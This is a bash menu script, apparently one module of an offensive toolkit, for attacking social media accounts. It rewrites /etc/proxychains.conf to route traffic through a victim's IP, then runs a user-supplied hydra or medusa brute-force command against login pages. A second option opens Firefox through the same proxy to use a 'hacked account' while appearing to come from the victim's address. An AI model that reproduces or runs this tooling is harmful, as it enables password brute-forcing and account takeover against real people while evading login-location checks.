clear
while :
do
echo ""
echo "Social Media"
echo "--------------------------------------"
echo ""
echo "  1.- Brute Force with victim IP Address (Proxy Config needed! go to Initial Menu > Proxy)"
echo "  2.- Access to hacked account with victim IP Address (Proxy Config needed! go to Initial Menu > Proxy)"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo -n "Select an option [SocialMedia]> "
read op6
case $op6 in
1) echo "[*] Selected: Brute Force"; 
clear
while :
do
echo ""
echo "Brute Force with victim IP"
echo "--------------------------------------"
echo ""
echo "  1.- Proxychains with victim proxy + medusa / hydra Bruteforcing"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [BruteForce]> "
read op61
case $op61 in
1) echo "[*] Selected: Proxychains + Hydra";
echo -n "Proxy / Victim IP Address [BruteForce]> "
read ip5412
echo -n "Proxy Port [BruteForce]> "
read port5412
echo "Eg.: http://twitter.com";
echo -n "Social Media URL [BruteForce]> "
read socialmedia000
echo "Eg.: hydra -l user -P passlist.txt ftp://192.168.0.1"
echo -n "Hydra or Medusa Command [BruteForce]> "
read hc999
echo "# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#	

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: 'basic'-http  'user/pass'-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
http $ip5412 $port5412
" > /etc/proxychains.conf
proxychains $hc999
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op61 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done;; 
2) echo "";
clear
while :
do
echo ""
echo "Access to hacked account with victim IP"
echo "--------------------------------------"
echo ""
echo "  1.- Proxychains with victim proxy + firefox"
echo ""
echo "  99.- Exit"
echo "--------------------------------------"
echo ""
echo -n "Select an option [AccessAccount]> "
read op62
case $op62 in
1) echo "[*] Selected: Proxychains + Firefox";
echo -n "Proxy / Victim IP Address [AccessAccount]> "
read ip5412
echo -n "Proxy Port [AccessAccount]> "
read port5412
echo "Eg.: http://twitter.com";
echo -n "Social Media URL [AccessAccount]> "
read socialmedia000
echo "# proxychains.conf  VER 3.1
#
#        HTTP, SOCKS4, SOCKS5 tunneling proxifier with DNS.
#	

# The option below identifies how the ProxyList is treated.
# only one option should be uncommented at time,
# otherwise the last appearing option will be accepted
#
dynamic_chain
#
# Dynamic - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# at least one proxy must be online to play in chain
# (dead proxies are skipped)
# otherwise EINTR is returned to the app
#
#strict_chain
#
# Strict - Each connection will be done via chained proxies
# all proxies chained in the order as they appear in the list
# all proxies must be online to play in chain
# otherwise EINTR is returned to the app
#
#random_chain
#
# Random - Each connection will be done via random proxy
# (or proxy chain, see  chain_len) from the list.
# this option is good to test your IDS :)

# Make sense only if random_chain
#chain_len = 2

# Quiet mode (no output from library)
#quiet_mode

# Proxy DNS requests - no leak for DNS data
proxy_dns 

# Some timeouts in milliseconds
tcp_read_time_out 15000
tcp_connect_time_out 8000

# ProxyList format
#       type  host  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#
#        Examples:
#
#            	socks5	192.168.67.78	1080	lamer	secret
#		http	192.168.89.3	8080	justu	hidden
#	 	socks4	192.168.1.49	1080
#	        http	192.168.39.93	8080	
#		
#
#       proxy types: http, socks4, socks5
#        ( auth types supported: 'basic'-http  'user/pass'-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
http $ip5412 $port5412
" > /etc/proxychains.conf
proxychains firefox $socialmedia000
;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op62 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done;;
99) echo "[*] Exiting...";
exit 1;;
*) echo "[!] $op6 is not a valid option.";
echo "Press enter to continue...";
read foo;;
esac
done

